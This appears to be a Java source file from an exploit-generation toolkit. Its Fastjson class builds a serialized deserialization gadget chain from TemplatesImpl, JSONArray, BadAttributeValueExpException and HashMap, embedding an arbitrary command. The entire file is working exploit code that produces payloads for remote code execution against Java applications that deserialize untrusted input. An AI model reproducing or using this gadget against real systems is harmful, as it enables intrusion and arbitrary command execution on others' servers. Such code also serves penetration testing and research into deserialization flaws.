package org.gadget;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.util.TemplateUtils;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Fastjson {
    public static byte[] getBytes(String common) throws Exception {
        TemplatesImpl template = TemplateUtils.getTemplate(common);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        Field field = bd.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(bd, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template,bd);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(hashMap);
        return byteArrayOutputStream.toByteArray();
    }
}
